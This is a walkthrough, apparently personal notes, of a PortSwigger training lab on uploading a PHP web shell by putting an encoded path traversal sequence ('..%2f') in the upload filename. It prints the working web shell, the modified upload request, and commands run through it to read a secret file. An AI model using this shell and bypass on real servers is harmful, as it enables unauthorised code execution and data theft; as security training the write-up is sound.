# Lab 03 — Web shell upload via path traversal

**Difficulty:** 🟡 Practitioner  
**Technique:** File Upload — path traversal in filename  
**Link:** https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

---

## Concept

The server is configured to not execute scripts in the `/files/avatars/` directory. By injecting a path traversal sequence in the `filename` field of the upload request, the file gets saved one level up in `/files/` where PHP execution is allowed.

---

## Process

### Step 1 — Prepare the web shell

```php
<?php echo system($_GET['command']); ?>
```

### Step 2 — Intercept the upload POST in Burp

Upload any image with Burp Intercept ON. Capture the POST request and send it to Repeater.

### Step 3 — Modify the filename with path traversal

Change the multipart body:

```
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
Content-Type: application/x-php

<?php echo system($_GET['command']); ?>
```

> `../` gets sanitized by the server — `..%2f` (URL encoded slash) bypasses it.

Server response:
```
The file avatars/../shell.php has been uploaded.
```

### Step 4 — Verify RCE

```
GET /files/shell.php?command=id HTTP/2
```

**Result:** `uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)`

### Step 5 — Exfiltrate the secret

```
GET /files/shell.php?command=cat+/home/carlos/secret HTTP/2
```

---

## Issues encountered

- Burp Intercept was OFF — the upload POST wasn't being captured. Fix: turn Intercept ON before submitting the upload form.
- `../` in the filename was sanitized by the server. Fix: use `..%2f` (URL encoded slash) instead.

---

## Takeaways

- The uploads directory may be configured to disallow script execution — path traversal in the filename moves the file to an executable location
- `../` in filenames is often sanitized — `..%2f` bypasses server-side stripping
- The file lands at `/files/shell.php` instead of `/files/avatars/shell.php`
- Burp Intercept must be ON at the moment of submitting the form to capture the upload POST

---

## References

- [File Upload Vulnerabilities — PortSwigger](https://portswigger.net/web-security/file-upload)
- [Path Traversal — PortSwigger](https://portswigger.net/web-security/file-path-traversal)
